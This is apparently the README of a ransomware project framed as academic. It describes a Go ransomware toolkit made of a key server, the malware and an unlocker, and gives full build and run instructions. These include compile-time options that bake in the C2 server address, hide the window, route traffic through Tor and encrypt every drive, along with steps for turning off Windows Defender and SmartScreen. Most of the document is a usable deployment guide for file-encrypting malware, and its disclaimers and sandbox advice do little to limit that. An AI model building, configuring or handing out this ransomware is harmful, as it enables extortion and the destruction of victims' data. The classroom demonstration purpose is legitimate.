# Ransomware

[![Build Status](https://travis-ci.org/mauri870/ransomware.svg?branch=master)](https://travis-ci.org/mauri870/ransomware)

> Note 1: This project is purely academic, use at your own risk. I do not encourage in any way the use of this software illegally or to attack targets without their previous authorization.

> Note 2: Unfortunately now some antiviruses (including Windows Defender) detects the unlocker as a virus. Disable any antivirus to play with the project.

**Remember, security is always a double-edged sword**

Demo video (Old version, without Tor support):

[![DEMO](https://img.youtube.com/vi/qyyV1dgRgiY/0.jpg)](https://youtu.be/qyyV1dgRgiY)

### What is Ransomware?

Ransomware is a type of malware that prevents or limits users from accessing their system, either by locking the system's screen or by locking the users' files unless a ransom is paid. More modern ransomware families, collectively categorized as crypto-ransomware, encrypt certain file types on infected systems and forces users to pay the ransom through certain online payment methods to get a decrypt key.

### Project Summary

This project was developed for the Computer Security course at my academic degree. Basically, it will encrypt your files in background using AES-256-CTR, a strong encryption algorithm, using RSA-4096 to secure the exchange with the server, optionally using the Tor SOCKS5 Proxy. The base functionality is what you see in the famous ransomware Cryptolocker.

The project is composed by three parts, the server, the malware and the unlocker.

The server store the victim's identification key along with the encryption key used by the malware.

The malware encrypt with a RSA-4096 (RSA-OAEP-4096 + SHA256) public key any payload before send then to the server. This approach with the optional Tor Proxy and a `.onion` domain allow you to hide almost completely your server.

### Features

- Run in Background (or not)
- Encrypt files using AES-256-CTR(Counter Mode) with random IV for each file.
- Multithreaded.
- RSA-4096 to secure the client/server communication.
- Includes an Unlocker.
- Optional TOR Proxy support.
- Use an AES CTR Cypher with stream encryption to avoid load an entire file into memory.
- Walk all drives by default.
- Docker image for compilation.

## How the demo works (architecture)

There are three moving parts:

1. **The server** — keeps a BoltDB database of victim ids and their AES keys, and holds the RSA private key (`private.pem`). It exposes two endpoints: `POST /api/keys/add` (used by the malware) and `GET /api/keys/:id` (used to recover a key).
2. **The malware** (`ransomware`) — generates a random 32-char victim id and a random 32-char AES key, encrypts that pair with the RSA public key baked into the binary at build time, and sends it to the server. Then it walks the target folders and encrypts every matching file with AES-256-CTR (a fresh random IV per file, stored as the first 16 bytes of the encrypted file). Encrypted files are renamed to `<base64-original-name>.encrypted`. Two notes are dropped on the victim's Desktop: `READ_TO_DECRYPT.html` (contains the victim id) and `FILES_ENCRYPTED.html` (list of encrypted files).
3. **The unlocker** — asks for the 32-char AES key and decrypts every `.encrypted` file back to its original name and content.

So the complete demo loop is: **run server → run malware → get the key from the server → run unlocker → files are back**.

## How to get the key back (TL;DR)

1. On the encrypted machine, open `READ_TO_DECRYPT.html` on the Desktop. The victim id is the 32-char string on the `YOUR IDENTIFICATION IS` line.
2. On the machine running the server, either:
   - look at the server console/log for the line printed when the malware registered:
     `Successfully saved key pair <ID> - <KEY>` — the KEY is right there, or
   - ask the API with the victim id:
     ```bash
     curl http://localhost:8080/api/keys/<ID>
     ```
     which answers `{"enckey":"<32-char key>","status":200}`.
3. Run `unlocker` on the encrypted machine, paste the 32-char key, answer `Y`, and every file is decrypted back in place.

> ⚠️ The key is checked only by length, not by value (CTR mode has no integrity check). A wrong key decrypts your files into garbage, permanently — always use the exact key the server stored for that id.

---

## Setup A — Everything inside a single Windows VM (easiest, zero networking)

This is the smoothest way to demo it in VirtualBox: server, malware and unlocker all run inside one Windows 10 VM, so nothing depends on network configuration.

### Step 1 — Build the binaries (on your Linux machine)

You need a recent Go toolchain (1.16+), `make`, `openssl` and `git`:

```bash
sudo apt update && sudo apt install -y golang make openssl git
git clone https://github.com/EdwinSanga-Hunter/demoranso
cd demoranso
make deps
make -e CLIENT_OS=windows CLIENT_ARCH=386 GOOS=windows
```

When it finishes you have everything you need inside `bin/`:

```
bin/ransomware.exe        # the malware (PE32, i386)
bin/unlocker.exe          # the unlocker (PE32, i386)
bin/server/
  ├── server.exe          # the server (x64)
  ├── private.pem         # RSA private key (must stay with the server)
  ├── cert.pem / key.pem  # self-signed certs (unused in the http demo)
```

### Step 2 — Prepare the Windows VM

1. Create a Windows 10 VM in VirtualBox. **Take a snapshot now**, so you can roll back when you're done.
2. Copy the whole `bin/` folder into the VM (the easiest is a Shared Folder with the Guest Additions installed; drag & drop works too).
3. Disable the antivirus inside the VM — Defender flags this demo:
   Start → Windows Security → Virus & threat protection → Manage settings → **Real-time protection: Off**.
4. If Windows blocks the executables (SmartScreen / "Mark of the Web"): right-click the exe → Properties → check **Unblock** → OK.

### Step 3 — Start the server (inside the VM)

Open a cmd window and run:

```cmd
cd C:\path\to\bin\server
server.exe --port 8080
```

Keep this window open. Check it works by opening `http://localhost:8080` in the VM's browser — you should see `OK`.

### Step 4 — Run the malware

No terminal needed for the audience: simply **double-click `ransomware.exe`** and accept the UAC prompt — a console window opens and shows the whole attack live. (The cmd route below is only needed if you want to scope the run with `RANSOMWARE_DIR`.)

Open **another cmd window as Administrator** (right-click → Run as administrator; the exe requests elevation):

```cmd
cd C:\path\to\bin
mkdir C:\demo
echo This is my top secret file > C:\demo\secret.txt
echo More secrets > C:\demo\report.docx
set RANSOMWARE_DIR=C:\demo
ransomware.exe
```

- The `set RANSOMWARE_DIR=C:\demo` line scopes the malware to a single test folder — ideal for a demo you can re-run.
- If you omit it, the malware walks **all drives** of the VM. Only do that in a throwaway VM.
- Watch the console: the malware registers its keys with the server, encrypts the files and renames them (e.g. `c2VjcmV0LnR4dA==.encrypted`).
- When it says `Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop`, look at the Desktop: you now have `READ_TO_DECRYPT.html` and `FILES_ENCRYPTED.html`.
- Press Enter to close the malware window.

### Step 5 — Get the key back

From the **server console** (Step 3 window) you will see the line:

```
Successfully saved key pair <ID> - <KEY>
```

Or, using the victim id from `READ_TO_DECRYPT.html` on the Desktop, run in the VM:

```cmd
curl http://localhost:8080/api/keys/<ID>
```

It answers `{"enckey":"<32-char key>","status":200}`. (Windows 10 ships `curl.exe`, so this works out of the box.)

### Step 6 — Decrypt your files

1. Double-click `unlocker.exe` (run it as Administrator).
2. Type (or paste) the 32-character key and press Enter.
3. Answer `Y` to the confirmation prompt.
4. The unlocker walks the same folder and restores every `.encrypted` file to its original name and content, then deletes the encrypted copies.
5. Check `C:\demo` — your files are back, byte for byte.

Roll back the VM snapshot when you're done playing.

---

## Setup B — Server on Linux, victim on a Windows VM (the classic two-machine setup)

This is closer to the real thing: the malware runs on the Windows VM and talks to the server over the network.

### Step 1 — Build with the server address baked in

The malware learns the server address at **compile time**, so build with the address the VM will use to reach your Linux machine:

```bash
make deps
# If the VM uses NAT networking: 10.0.2.2 is the host, seen from inside the guest
make -e CLIENT_OS=windows CLIENT_ARCH=386 SERVER_HOST=10.0.2.2 SERVER_PORT=8080
```

Other options for `SERVER_HOST`:

| VirtualBox network mode | SERVER_HOST to use  |
|-------------------------|---------------------|
| NAT (default)           | `10.0.2.2`          |
| Host-only network       | `192.168.56.1`      |
| Server in another VM    | that VM's IP        |

### Step 2 — Start the server on Linux

```bash
cd bin/server
./server --port 8080
```

Verify from the Linux machine:

```bash
curl http://localhost:8080/
# OK
```

If the VM can't reach it later, allow the port on the host firewall:

```bash
sudo ufw allow 8080
```

### Step 3 — Run the malware inside the Windows VM

1. Copy only `bin/ransomware.exe` and `bin/unlocker.exe` into the VM (Shared Folder or drag & drop).
2. Disable Defender real-time protection and unblock the files (same as Setup A, Step 2).
3. From inside the VM, test connectivity first — this avoids 90% of the problems:

   ```cmd
   curl http://10.0.2.2:8080/
   ```

   It must answer `OK`. If it hangs, the networking/firewall step above is wrong.
4. Run `ransomware.exe` as Administrator. With `set RANSOMWARE_DIR=C:\demo` it encrypts just that folder; without it, it walks all drives.
   
5. Watch the server console on Linux: `Successfully saved key pair <ID> - <KEY>` proves the key exchange (encrypted with the RSA-4096 public key) worked.

### Step 4 — Get the key and decrypt

Exactly as in Setup A: take the `<ID>` from the VM's Desktop `READ_TO_DECRYPT.html`, then on the **Linux** machine:

```bash
curl http://localhost:8080/api/keys/<ID>
# {"enckey":"<32-char key>","status":200}
```

Run `unlocker.exe` on the VM, paste the key, answer `Y`. Files restored.

---

## Setup C — Everything inside a single Linux VM (encrypts the whole VM)

If you prefer a pure-Linux demo (Kali/Debian/Ubuntu VM), everything also runs locally. On linux the malware walks the **entire filesystem** by default — just like walking all drives on windows — so it encrypts every matching file in the VM. Virtual and device directories (`/proc`, `/sys`, `/dev`, `/run`, `/boot`, `/snap`, `lost+found`) are skipped automatically, so the walk can't hang or destroy the VM disk. Set `RANSOMWARE_DIR` to scope the demo to a single folder instead.

> ⚠️ Only run the default whole-system mode inside a disposable VM, with a snapshot taken first. VirtualBox shared folders mounted as `sf_*` are skipped automatically to protect your host — any manually mounted shared folder is not, so unmount it before running.

```bash
# 1. Install prerequisites
sudo apt update && sudo apt install -y golang make openssl git curl
# (if apt's golang is missing or too old, install from the official tarball:
#  wget https://go.dev/dl/go1.26.7.linux-amd64.tar.gz
#  sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.26.7.linux-amd64.tar.gz
#  echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc)
go version          # verify: go1.16+ is enough

# 2. Get the code and build
git clone https://github.com/EdwinSanga-Hunter/demoranso
cd demoranso
make deps
make
make demo-launcher  # double-click icons on the Desktop

# 3. (Optional) put a few dummy files in place so the demo hits them
make demo-files      # creates ~/ransomware-demo/{secret.txt,report.pdf,photo.png,database.db}
```

Take a **VirtualBox snapshot** of the fresh VM now — after every demo, restore the snapshot and the machine is clean again without rebuilding.

Terminal 1 — start the server (logged to a file so the key can never get lost):

```bash
cd demoranso && ./scripts/run-server.sh 2>&1 | tee ~/server-key.log
```

Terminal 2 — run the malware:

```bash
cd demoranso && ./bin/ransomware
```

It registers the keys with the server, then walks `/` encrypting every matching file (`.txt`, `.pdf`, `.conf`, `.db`, images, ...) and renaming them to `<base64-name>.encrypted`. `READ_TO_DECRYPT.html` and `FILES_ENCRYPTED.html` appear on `~/Desktop`.

Get the key back — it is registered **before** any file is encrypted, so it's available immediately, three ways:

1. Server terminal / log file:

```bash
grep 'Successfully saved key pair' ~/server-key.log
```

2. API (the server's own `database.db` is protected by a file lock and never encrypted):

```bash
ID=$(tr -d '\r' < ~/Desktop/READ_TO_DECRYPT.html | grep -A1 'YOUR IDENTIFICATION IS' | tail -1 | tr -d '[:space:]')
curl http://localhost:8080/api/keys/$ID
# {"enckey":"<32-char key>","status":200}
```

3. Auto-extract the key straight from the log:

```bash
KEY=$(grep -o 'Successfully saved key pair [a-f0-9]* - [a-f0-9]*' ~/server-key.log | tail -1 | awk '{print $NF}')
echo $KEY
```

Then decrypt (click **Unlocker Demo** and paste the key, or from a terminal):

```bash
printf '%s\nY\n' "$KEY" | ./bin/unlocker
```

The unlocker walks `/` and restores every `.encrypted` file to its original name and content.

**Scoped version** (encrypt just one folder — handy for quick repeatable tests):

```bash
RANSOMWARE_DIR=~/ransomware-demo ./bin/ransomware
RANSOMWARE_DIR=~/ransomware-demo ./bin/unlocker
```

**Double-click demo (the audience never sees a terminal)**

For presenting to non-technical people, everything can be started from the Desktop:

```bash
make demo-launcher   # creates three launchers on ~/Desktop
```

1. Double-click **Demo Server** — a terminal opens with the server running; leave it open.
   (First time on GNOME: right-click the launcher → Allow Launching.)
2. Double-click **Ransomware Demo** — a terminal pops up with the banner, and the files encrypt live in front of the audience.
3. Grab the key from the server window: `Successfully saved key pair <ID> - <KEY>`.
4. Double-click **Unlocker Demo**, paste the 32-char key, press Enter, answer `Y` — the files come back.

That's the whole demo with zero commands for the audience.

> Note: `make` recreates `bin/` from scratch, so it also wipes the server's `database.db` with any keys registered so far.

---

### Building the binaries (reference)

> DON'T RUN THE RANSOMWARE BINARY IN YOUR PERSONAL MACHINE, EXECUTE ONLY IN A TEST ENVIRONMENT! I'm not resposible if you acidentally encrypt all of your disks!

```bash
make deps   # downloads modules and installs the rsrc + go-bindata tools
make        # builds ransomware, unlocker and the server for your host OS
make -e CLIENT_OS=windows CLIENT_ARCH=386   # classic windows executables
make -e GOOS=windows                        # server built for windows
```

#### Docker

```bash
./build-docker.sh make
```

#### Config Parameters

You can change some of the configs during compilation. Instead of run only `make`, you can use the following variables:

```bash
HIDDEN='-H windowsgui' # optional (windows only). If present the malware will run in background

USE_TOR=true # optional. On windows the malware downloads the Tor proxy and uses it to contact the server. On linux it expects a locally running tor service on 127.0.0.1:9050

SERVER_HOST=mydomain.com # the domain used to connect to your server. localhost, 0.0.0.0, 127.0.0.1 works too if you run the server on the same machine as the malware

SERVER_PORT=8080 # the server port, if using a domain you can set this to 80

CLIENT_OS=windows # the target os for the malware/unlocker (defaults to the host os)

CLIENT_ARCH=386 # the target arch for the malware/unlocker (defaults to 386 on windows)

GOOS=linux # the target os to compile the server. Eg: darwin, linux, windows
```

Example:

`make -e USE_TOR=true SERVER_HOST=mydomain.com SERVER_PORT=80 GOOS=darwin`

The `SERVER_` variables above only apply to the malware. The server has a flag `--port` that you can use to change the port that it will listen on.

At runtime, the malware and unlocker accept an optional `RANSOMWARE_DIR` environment variable pointing to a single folder to encrypt/decrypt. Without it, on windows all drives are walked, and on linux the whole filesystem is walked (virtual/device dirs are skipped).

---

## Troubleshooting

| Symptom | Cause / fix |
|---------|-------------|
| `422 - Error validating payload, bad public key` repeated in the malware console | The RSA public key baked into the exe does not match the server's `private.pem` (mixed builds). Rebuild everything in a single `make` run and keep `bin/server/private.pem` with the `server` binary it was built with. |
| `Ops, something went terribly wrong when contacting the C&C...` or `Timeout reached. Aborting...` | The server is unreachable: is it running? Is `SERVER_HOST` correct for your network mode (`10.0.2.2` on NAT)? Is the port right? Test from the VM with `curl http://10.0.2.2:8080/` — it must answer `OK`. Check the host firewall (`sudo ufw allow 8080`). |
| The unlocker says nothing was decrypted | The `RANSOMWARE_DIR` used for decrypting must match the one used for encrypting (or be unset in both runs). Files encrypted under a different folder scope aren't walked. |
| Decrypted files are garbage | You typed the wrong key (CTR has no integrity check). Get the exact key from the server (`GET /api/keys/<ID>` or the server log) and re-run — never guess keys. |
| Windows blocks the exe / Defender quarantines it | Right-click → Properties → Unblock, and turn off Defender real-time protection inside the VM (see Setup A, Step 2). |
| Keys registered earlier disappeared after `make` | `make` wipes `bin/`, including `bin/server/database.db` and the private key. That's a fresh start by design — re-run the demo, or back up `bin/server` before rebuilding. |
| `go: cannot find main module` / missing `go.sum` entries when building | Run `go mod tidy` once, then build again. |
| On linux, nothing got encrypted | The default run walks the whole filesystem, so check that the files you expect have matching extensions (see `cmd/common.go`) and are under 20 MB. If you used `RANSOMWARE_DIR`, make sure it points at an existing folder. |

## The end

As you can see, building a functional ransomware, with some of the best existing algorithms is not dificult, anyone with some programming skills can build that in any programming language.
